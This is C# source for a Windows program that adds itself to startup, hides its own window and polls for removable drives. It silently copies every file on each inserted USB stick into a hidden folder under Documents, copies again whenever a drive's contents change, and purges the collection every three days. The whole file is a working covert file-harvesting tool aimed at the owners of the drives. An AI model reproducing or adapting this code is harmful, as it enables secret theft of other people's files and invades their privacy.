using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Collections;
using Add_Programme_To_Startup;

namespace Mission_Umimpossible
{

    public partial class Form1 : Form
    {
        Hashtable devices;
        string path;
        string path1 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + Path.DirectorySeparatorChar
                             + "Mission UnImpossible";
        public Form1()
        {
            InitializeComponent();
            StartUp.AddProgrammeToStartUp("mission unimpossible"); //Adding Programme To StartUp

            devices = new Hashtable(); // Hashtable To Store Device Name And Free Space

            checkFolderToDelete();

            timer1.Start();
        }

        void checkFolderToDelete()
        {
            string FileToCheckDeleteDate = path1 + Path.DirectorySeparatorChar + "lastModifies";

            if (!Directory.Exists(path1))
                Directory.CreateDirectory(path1);

            if (!File.Exists(FileToCheckDeleteDate))
            {
                try
                {
                    using (StreamWriter writer = new StreamWriter(FileToCheckDeleteDate))
                    {
                        writer.WriteLine(DateTime.Now.ToString());
                    }
                    return;
                }
                catch (Exception)
                {

                }
            }

            string temp = "";
            try
            {
                using (StreamReader reader = new StreamReader(FileToCheckDeleteDate))
                {
                    temp = reader.ReadLine();
                }
            }
            catch (Exception)
            {

            }

            DateTime previousDate = Convert.ToDateTime(temp);
            DateTime currentDate = DateTime.Now;

            TimeSpan timeSpan = currentDate.Subtract(previousDate);

            if (timeSpan.Days >= 3)
            {
                try
                {
                    if (Directory.Exists(path1))
                    {
                        deleteDirectory(path1);
                    }

                    Directory.CreateDirectory(path1);

                    using (StreamWriter writer = new StreamWriter(FileToCheckDeleteDate))
                    {
                        writer.WriteLine(DateTime.Now.ToString());
                    }
                }
                catch (Exception e)
                {
                }
            }
        }

        private void deleteDirectory(string targetDirectory)
        {
            string[] files = Directory.GetFiles(targetDirectory);
            string[] subDirectories = Directory.GetDirectories(targetDirectory);

            foreach(string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach(string dir in subDirectories)
            {
                deleteDirectory(dir);
            }
            Directory.Delete(targetDirectory, false);
        }

        //Creating A Acceptable Folder Name
        string folderName(string name)
        {
            string temp = "";

            foreach (char ch in name)
            {
                if ((ch >= 'A' && ch <= 'z') || (ch >= '0' && ch <= '9') || ch == ' ')
                {
                    temp += ch;
                }
                else
                    temp += '.';
            }

            return temp;
        }

        //Searching For Available Drive To Perform Action
        void searchDevices()
        {
            DriveInfo[] drive = DriveInfo.GetDrives();

            for (int i = 0; i < drive.Length; i++)
            {
                if (drive[i].IsReady && drive[i].DriveType == DriveType.Removable
                    && (drive[i].DriveFormat == "FAT32" || drive[i].DriveFormat == "NTFS"))
                {
                    //if Device Connecte First Time
                    if (!devices.Contains(drive[i].VolumeLabel))
                    {
                        devices.Add(drive[i].VolumeLabel, drive[i].AvailableFreeSpace.ToString());
                        copyFiles(drive[i].ToString());
                        continue;
                    }

                    //Already Copied But Checking for Available Update Information
                    if (devices.Contains(drive[i].VolumeLabel))
                    {
                        string s = devices[drive[i].VolumeLabel].ToString();
                        string t = drive[i].AvailableFreeSpace.ToString();

                        //Updated USB Content After Coping
                        if (s != t)
                        {
                            //copy files
                            if (!Directory.Exists(path))
                                Directory.CreateDirectory(path);

                            copyFiles(drive[i].ToString());

                            devices[drive[i].VolumeLabel] = drive[i].AvailableFreeSpace.ToString();

                        }

                    }

                }
            }
        }

        //Coping Files Adjactly As Source Device
        private void copyFiles(string fileLocation)
        {
            string[] files = Directory.GetFiles(fileLocation, "*.*", SearchOption.AllDirectories); //Getting All Files

            path = path1 + Path.DirectorySeparatorChar + folderName(DateTime.Now.ToString());

            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            foreach (string f in files)
            {
                string parentDirectory = Directory.GetParent(f).Name;
                string fileName = Path.GetFileName(f);
                string destinationPath = path + Path.DirectorySeparatorChar;


                if (parentDirectory.Length != 3) // if the file is in a folder in USB drive
                {
                    destinationPath += parentDirectory + "\\";


                    if (!Directory.Exists(destinationPath))
                        Directory.CreateDirectory(destinationPath);
                }

                destinationPath = Path.Combine(destinationPath, fileName);

                try
                {
                    File.Copy(f, destinationPath, true);

                }
                catch (Exception e)
                {
                }
            }
        }




        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.Hide();
            searchDevices();
        }
    }
}
